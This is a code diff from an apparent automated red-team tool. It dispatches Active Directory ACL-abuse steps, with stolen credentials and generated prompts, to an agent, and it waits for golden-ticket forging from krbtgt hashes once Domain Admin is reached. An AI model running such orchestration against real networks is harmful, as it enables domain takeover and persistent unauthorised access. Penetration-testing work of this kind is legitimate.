+                                password=prev_step.new_credential.get("password", ""),
+                                domain=chain.domain,
+                                source="acl_chain",
+                            )
+                    else:
+                        logger.debug(
+                            f"🔗 ACL chain {chain.chain_id}: No credentials for source {current_step.source}"
+                        )
+                        continue
+
+                # Generate prompt for this step
+                prompt = tracker.generate_step_prompt(chain, current_step, chain.domain)
+
+                logger.info(
+                    f"🔗 ACL chain {chain.chain_id} step {current_step.step_id}: "
+                    f"{current_step.source} -> {current_step.target} ({current_step.action.value})"
+                )
+
+                # Dispatch to ACL agent
+                if source_cred is None:  # Should never happen due to continue above
+                    continue
+                try:
+                    task_id = await dispatcher.dispatch_task(
+                        agent_role="acl",
+                        task_type="acl_chain_step",
+                        description=f"ACL chain step: {current_step.source} -> {current_step.target}",
+                        payload={
+                            "chain_id": chain.chain_id,
+                            "step_id": current_step.step_id,
+                            "source": current_step.source,
+                            "target": current_step.target,
+                            "right": current_step.right,
+                            "action": current_step.action.value,
+                            "domain": chain.domain,
+                            "username": source_cred.username,
+                            "password": source_cred.password,
+                            "prompt": prompt,
+                        },
+                    )
+                    state.dispatched_acl_steps.add(step_key)
+                    logger.info(f"Dispatched ACL chain step: {task_id}")
+                except Exception as e:
+                    logger.warning(f"🔗 Failed to dispatch ACL chain step: {e}")
+
+            # Check for newly discovered chains from BloodHound output
+            # (This is handled in result_processing via extract_acl_chains_from_bloodhound)
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto ACL chain error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
 def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
     """Get task IDs for crack tasks that are still pending (running)."""
     crack_task_ids = []
@@ -2268,7 +2886,7 @@ def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
 
 async def _wait_for_crack_tasks(
     dispatcher: RedTeamDispatcher,
-    timeout: float = CRACK_TASK_GRACE_PERIOD,
+    timeout: float | None = None,
     check_interval: float = 5.0,
 ) -> None:
     """
@@ -2276,9 +2894,11 @@ async def _wait_for_crack_tasks(
 
     Args:
         dispatcher: The dispatcher instance
-        timeout: Maximum seconds to wait for crack tasks
+        timeout: Maximum seconds to wait for crack tasks (default from config)
         check_interval: Seconds between checks
     """
+    if timeout is None:
+        timeout = get_crack_task_grace_period()
     start_time = asyncio.get_event_loop().time()
     crack_tasks = _get_running_crack_tasks(dispatcher)
 
@@ -2314,6 +2934,88 @@ async def _wait_for_crack_tasks(
         await asyncio.sleep(check_interval)
 
 
+async def _wait_for_golden_ticket(
+    dispatcher: RedTeamDispatcher,
+    timeout: float = 120.0,
+    check_interval: float = 5.0,
+) -> None:
+    """
+    Wait for golden ticket generation if krbtgt hash is available.
+
+    When DA is achieved, we may have a krbtgt hash that the _auto_golden_ticket
+    background task hasn't processed yet. This function waits for golden ticket
+    generation to complete (or timeout) before exiting.
+
+    Args:
+        dispatcher: The dispatcher instance
+        timeout: Maximum seconds to wait for golden ticket
+        check_interval: Seconds between checks
+    """
+    state = dispatcher.shared_state
+
+    # Find krbtgt hashes that don't have corresponding golden tickets yet
+    processed_domains = {
+        t.get("domain", "").lower()
+        for t in state.golden_tickets
+        if t.get("domain")
+        and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
+    }
+
+    pending_krbtgt_domains = set()
+    for hash_obj in state.all_hashes:
+        if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
+            domain = (hash_obj.domain or "").lower()
+            if domain and domain not in processed_domains:
+                pending_krbtgt_domains.add(domain)
+
+    if not pending_krbtgt_domains:
+        if state.has_golden_ticket:
+            logger.info("🎫 Golden ticket already generated")
+        return
+
+    logger.info(
+        f"🎫 Waiting for golden ticket generation for {len(pending_krbtgt_domains)} domain(s): "
+        f"{pending_krbtgt_domains} (timeout: {timeout}s)"
+    )
+
+    start_time = asyncio.get_event_loop().time()
+
+    while True:
+        elapsed = asyncio.get_event_loop().time() - start_time
+
+        if elapsed > timeout:
+            logger.warning(
+                f"🎫 Golden ticket generation timed out after {timeout}s. "
+                f"Pending domains: {pending_krbtgt_domains}"
+            )
+            break
+
+        # Check if golden ticket was generated
+        if state.has_golden_ticket:
+            logger.success("🎫 Golden ticket generated successfully!")
+            break
+
+        # Check if all pending domains have been processed (success or failure)
+        processed_domains = {
+            t.get("domain", "").lower()
+            for t in state.golden_tickets
+            if t.get("domain")
+            and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
+        }
+        remaining = pending_krbtgt_domains - processed_domains
+        if not remaining:
+            if state.has_golden_ticket:
+                logger.success("🎫 Golden ticket generated successfully!")
+            else:
+                logger.warning("🎫 All golden ticket attempts completed (some may have failed)")
+            break
+
+        logger.debug(
+            f"🎫 Waiting for golden ticket ({elapsed:.0f}s/{timeout:.0f}s) - pending: {remaining}"
+        )
+        await asyncio.sleep(check_interval)
+
+
 async def _wait_for_completion(
     dispatcher: RedTeamDispatcher,
     background_tasks: list[asyncio.Task],
@@ -2337,6 +3039,8 @@ async def _wait_for_completion(
         # Check runtime limit
         if elapsed > max_runtime:
             logger.warning(f"Operation reached max runtime ({max_runtime}s)")
+            # Still try for golden ticket if we have krbtgt (quick operation)
+            await _wait_for_golden_ticket(dispatcher, timeout=60.0)
             # Wait for running crack tasks before fully exiting
             await _wait_for_crack_tasks(dispatcher)
             break
@@ -2344,11 +3048,15 @@ async def _wait_for_completion(
         # Check for domain admin or explicit completion
         if dispatcher.shared_state.has_domain_admin:
             logger.success("Domain Admin achieved! Operation complete.")
+            # Wait for golden ticket generation (if krbtgt hash is available)
+            await _wait_for_golden_ticket(dispatcher)
             # Wait for running crack tasks before fully exiting
             await _wait_for_crack_tasks(dispatcher)
             break
         if dispatcher.shared_state.completed:
             logger.success("Operation marked complete.")
+            # Wait for golden ticket generation (if krbtgt hash is available)
+            await _wait_for_golden_ticket(dispatcher)
             # Wait for running crack tasks before fully exiting
             await _wait_for_crack_tasks(dispatcher)
             break
